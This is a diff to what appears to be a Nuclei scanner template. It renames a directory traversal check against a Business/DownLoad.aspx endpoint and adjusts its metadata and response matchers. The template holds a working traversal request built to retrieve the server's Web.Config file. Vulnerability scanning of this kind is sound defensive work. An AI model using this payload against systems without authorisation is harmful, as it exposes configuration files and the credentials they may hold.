@@ -1,13 +1,11 @@
-id: path-traversal-web-config
+id: business-download-directory-traversal
 
 info:
-  name: Path Traversal via DownloadFile Parameter
+  name: Directory Traversal in Business Download Endpoint
   author: chippa vijay kumar
   severity: high
-  description: Checks for path traversal vulnerability by attempting to download the Web.Config file.
-  reference:
-    - https://owasp.org/www-community/attacks/Path_Traversal
-  tags: pathtraversal,cve,vuln
+  description: This template checks for directory traversal vulnerability by attempting to access the Web.Config file through the Business/DownLoad.aspx endpoint.
+  tags: directory-traversal, config-exposure
 
 requests:
   - method: GET
@@ -15,19 +13,18 @@ requests:
       - "{{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
 
     headers:
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
-      Content-Type: application/x-www-form-urlencoded
-      Accept-Encoding: gzip, deflate
-      Accept: */*
-      Connection: keep-alive
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+      Content-Type: "application/x-www-form-urlencoded"
+      Accept-Encoding: "gzip, deflate"
+      Accept: "*/*"
+      Connection: "keep-alive"
 
     matchers-condition: and
     matchers:
       - type: word
         words:
           - "<configuration>"
-          - "<appSettings>"
-          - "<connectionStrings>"
+          - "<system.web>"
         part: body
 
       - type: status
